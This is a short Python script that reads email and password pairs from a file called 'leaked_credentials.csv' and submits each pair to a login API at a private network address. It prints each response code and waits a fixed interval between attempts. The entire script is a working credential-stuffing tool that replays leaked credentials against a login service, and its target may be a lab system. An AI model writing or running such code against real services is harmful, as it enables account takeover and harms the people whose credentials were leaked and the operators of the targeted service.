import csv
import requests
import time

API_URL = "http://172.20.10.13:5000/login"

def send_login(email, password):
    response = requests.post(API_URL, json={"email": email, "password": password})
    print(f"{email} : {password} -> {response.status_code}")

with open('leaked_credentials.csv', 'r') as file:
    reader = csv.DictReader(file)
    for row in reader:
        send_login(row['email'], row['password'])
        time.sleep(0.36)

    
